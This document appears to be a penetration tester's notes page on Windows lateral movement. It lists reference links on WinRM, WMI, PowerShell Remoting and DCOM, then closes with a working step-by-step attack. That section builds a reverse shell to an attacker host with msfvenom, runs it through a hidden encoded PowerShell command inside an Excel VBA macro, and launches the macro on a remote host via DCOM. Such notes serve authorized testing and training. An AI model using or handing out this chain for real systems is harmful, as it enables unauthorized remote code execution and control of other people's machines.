# Lateral Movement

## Tools

* [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)

## Kerberos

[Link](active-directory.md#kerberos)

## Windows Management Instrumentation (WMI)

* [https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf](https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf)
* [https://www.trustedsec.com/blog/no\_psexec\_needed/](https://www.trustedsec.com/blog/no\_psexec\_needed/)

## Powershell Remoting

* [https://www.netspi.com/blog/technical/network-penetration-testing/powershell-remoting-cheatsheet/](https://www.netspi.com/blog/technical/network-penetration-testing/powershell-remoting-cheatsheet/)
* [https://adamtheautomator.com/psremoting/](https://adamtheautomator.com/psremoting/)
* [https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands)
* [http://www.harmj0y.net/blog/empire/expanding-your-empire/](http://www.harmj0y.net/blog/empire/expanding-your-empire/)

## Distributed Component Object Model (DCOM)

* [https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-anddotnettojscript/](https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-anddotnettojscript/)
* [https://attactics.org/2018/02/03/lateral-movement-with-powerpoint-and-dcom/](https://attactics.org/2018/02/03/lateral-movement-with-powerpoint-and-dcom/)
* [https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)

### Using Excel Macros

{% hint style="info" %}
Requires:

* Office installed on both source and target hosts
* Local admin privileges
{% endhint %}

Create a HTA reverse shell using msfvenom:

```
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=8080 -f hta-psh -o rshell.hta
```

Extract the encoded Powershell command:

```
powershell.exe -nop -w hidden -e aQBmACg...
```

Convert it to VBA format:

```
Sub mymacro()
    Dim Str As String
    Str = "powershell.exe -nop -w hidden -e aQBm..."
    Str = Str + "..."
    CreateObject("Wscript.Shell").Run Str
End Sub
```

Call the macro on target host using Excel through DCOM:

```
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "target_ip"))
$LocalPath = "C:\excel.xls"
$RemotePath = "\\target_ip\c$\excel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
$Path = "\\target_ip\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)
$Workbook = $com.Workbooks.Open("C:\excel.xls")
$com.Run("mymacro")
```
